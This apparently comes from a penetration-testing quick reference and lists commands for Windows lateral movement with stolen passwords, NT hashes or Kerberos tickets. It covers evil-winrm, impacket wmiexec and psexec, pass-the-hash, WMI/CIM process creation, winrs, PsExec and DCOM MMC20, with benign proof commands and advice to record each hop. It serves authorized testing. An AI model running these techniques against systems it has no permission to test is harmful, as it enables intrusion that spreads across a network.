# Lateral movement checks

[← Active Directory quick reference](../05-active-directory.md)

Match the credential or ticket to a service the target exposes. WMI/DCOM needs RPC on 135; WinRM commonly uses 5985/5986; SMB service execution needs 445, administrative access, and a usable share. Test a short identity command first.

## Password or NT hash

```bash
evil-winrm -i <target-ip> -u <user> -p '<password>'
impacket-wmiexec <domain.tld>/<user>:<password>@<target-ip>
```

```bash
evil-winrm -i <target-ip> -u <user> -H <nt-hash>
impacket-wmiexec -hashes :<nt-hash> <domain.tld>/<user>@<target-ip>
```

Pass the Hash applies to services that accept NTLM. It does not turn a NetNTLMv2 challenge-response into a reusable NT hash.

## Kerberos ticket

An NT hash can also be used to obtain a TGT. Keep the resulting cache tied to the account and domain that produced it.

```bash
impacket-getTGT <domain.tld>/<user> -hashes :<nt-hash>
export KRB5CCNAME=<user>.ccache
impacket-psexec -k -no-pass <domain.tld>/<user>@<target-fqdn>
```

A TGS only covers its named service. If a Kerberos command fails, check the target FQDN, SPN, DNS, and clock before trying unrelated credentials.

## Direct WMI check

```powershell
$password = ConvertTo-SecureString '<password>' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $password)
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName <target-ip> -Credential $credential -SessionOption $options
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'cmd /c hostname'}
```

Record the source host, destination, account, access level, and result at each hop. A successful authentication check is not yet proof of remote code execution.

## Windows-side alternatives

Use the remote service that is actually open. WinRS and PowerShell remoting use WinRM; PsExec needs SMB and service-control access on the target.

```cmd
winrs -r:<target-host> -u:<domain>\<user> -p:<password> "cmd /c hostname & whoami"
```

```powershell
$password = ConvertTo-SecureString '<password>' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $password)
$session = New-PSSession -ComputerName <target-host> -Credential $credential
Enter-PSSession $session
```

```powershell
.\PsExec64.exe \\<target-host> -u <domain>\<user> -p <password> cmd
```

DCOM's MMC path is another remote process check when the account is a local administrator and RPC is reachable. The created process can run in session 0, so use a proof command that leaves output you can inspect.

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1', '<target-host>'))
$dcom.Document.ActiveView.ExecuteShellCommand('cmd', $null, '/c hostname > C:\Windows\Temp\dcom-check.txt', '7')
```
